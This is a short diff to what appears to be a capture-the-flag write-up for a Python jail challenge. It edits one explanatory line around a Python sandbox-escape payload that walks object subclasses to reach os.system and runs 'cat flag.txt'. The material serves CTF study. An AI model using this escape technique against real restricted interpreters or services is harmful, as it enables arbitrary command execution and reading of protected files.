@@ -12,7 +12,7 @@ Refer to the first [challenge](https://github.com/Coder-Here/ShaktiCTF/blob/main
 ```
 print([].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt'))
 
-the above does not work, try the below one
+the above does not work, try the below one without the print function
 
 [].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt')
 ```
